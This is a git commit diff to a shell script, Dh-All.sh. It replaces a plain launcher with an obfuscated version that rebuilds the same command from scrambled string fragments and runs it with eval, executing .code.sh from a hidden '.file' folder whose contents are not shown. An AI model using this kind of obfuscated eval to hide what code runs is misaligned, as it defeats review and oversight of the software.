30f642aef35af0972711be9ebee906e2b0eacd3a
Naiyan AR Rahman <77504180+naiyan-official@users.noreply.github.com>
2021-05-14 20:48:30 +0600

    Update Dh-All.sh

--- Dh-All.sh
+++ Dh-All.sh
@@ -1,2 +1,4 @@
-#!/usr/bin/bash
-cd && cd Dh-All && cd .file && bash .code.sh
+
+z="
+";Kz='e.sh';Iz='ash ';Az='cd &';Bz='& cd';Dz='All ';Fz='d .f';Ez='&& c';Gz='ile ';Hz='&& b';Jz='.cod';Cz=' Dh-';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz"
